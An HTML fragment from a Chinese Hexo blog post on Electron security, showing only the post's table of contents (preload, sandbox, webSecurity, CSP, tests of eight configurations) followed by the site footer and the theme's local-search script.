href="#Preload%E9%A2%84%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%AC"><span class="toc-text">Preload预加载脚本[8]</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E5%AE%9E%E4%BE%8B%EF%BC%9A%E6%B8%B2%E6%9F%93%E8%BF%9B%E7%A8%8B%E5%88%B0%E4%B8%BB%E8%BF%9B%E7%A8%8B%EF%BC%88%E5%8F%8C%E5%90%91%EF%BC%89"><span class="toc-text">官方实例：渲染进程到主进程（双向）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sandbox"><span class="toc-text">Sandbox[10]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8D%8F%E8%AE%AE"><span class="toc-text">自定义协议[12]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webSecurity"><span class="toc-text">webSecurity[13]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5CSP"><span class="toc-text">内容安全策略CSP[14]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9v37-2-6%E5%90%84%E7%A7%8D%E9%85%8D%E7%BD%AE%E7%9A%84%E5%AE%9E%E9%99%85%E5%8D%B1%E5%AE%B3%E6%B5%8B%E8%AF%95"><span class="toc-text">针对v37.2.6各种配置的实际危害测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%92%8Cpayload"><span class="toc-text">测试环境和payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E9%85%8D%E7%BD%AE5"><span class="toc-text">默认配置(配置5)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%ACpreload"><span class="toc-text">预加载脚本preload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E8%BF%9B%E7%A8%8B-2"><span class="toc-text">渲染进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe"><span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE1"><span class="toc-text">配置1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%ACpreload-2"><span class="toc-text">预加载脚本preload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E8%BF%9B%E7%A8%8B-3"><span class="toc-text">渲染进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe-2"><span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93-2"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE2"><span class="toc-text">配置2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%ACpreload-%E2%9C%94%EF%B8%8F"><span class="toc-text">预加载脚本preload ✔️</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E8%84%9A%E6%9C%AC"><span class="toc-text">渲染脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe-3"><span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93-3"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE3"><span class="toc-text">配置3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%ACpreload-3"><span class="toc-text">预加载脚本preload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E8%84%9A%E6%9C%AC-2"><span class="toc-text">渲染脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe-4"><span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93-4"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE4"><span class="toc-text">配置4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%ACpreload-%E2%9C%94%EF%B8%8F-2"><span class="toc-text">预加载脚本preload ✔️</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E8%84%9A%E6%9C%AC-%E2%9C%94%EF%B8%8F"><span class="toc-text">渲染脚本 ✔️</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe-5"><span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93-5"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE6"><span class="toc-text">配置6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%ACpreload-%E2%9C%94%EF%B8%8F-3"><span class="toc-text">预加载脚本preload ✔️</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E8%84%9A%E6%9C%AC-3"><span class="toc-text">渲染脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe-6"><span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93-6"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE7"><span class="toc-text">配置7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%ACpreload-4"><span class="toc-text">预加载脚本preload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E8%84%9A%E6%9C%AC-4"><span class="toc-text">渲染脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe-7"><span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93-7"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE8"><span class="toc-text">配置8</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD%E8%84%9A%E6%9C%ACpreload-%E2%9C%94%EF%B8%8F-4"><span class="toc-text">预加载脚本preload ✔️</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E8%84%9A%E6%9C%AC-5"><span class="toc-text">渲染脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe-8"><span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93-8"><span class="toc-text">小结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%E9%83%A8%E5%88%86"><span class="toc-text">补充部分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E6%B5%8B%E8%AF%95"><span class="toc-text">我的测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E7%BB%93%E8%AE%BA"><span class="toc-text">我的结论</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/x2nn">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://x2nn.github.io">Copyright © 2024 - 2025 X2n.</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98 + '&url=' + https%3A%2F%2Fx2nn.github.io%2F2025%2F08%2F12%2FElectron%25E4%25B8%25AD%25E7%259A%2584%25E5%25AE%2589%25E5%2585%25A8%25E9%2597%25AE%25E9%25A2%2598%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://x2nn.github.io/2025/08/12/Electron%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
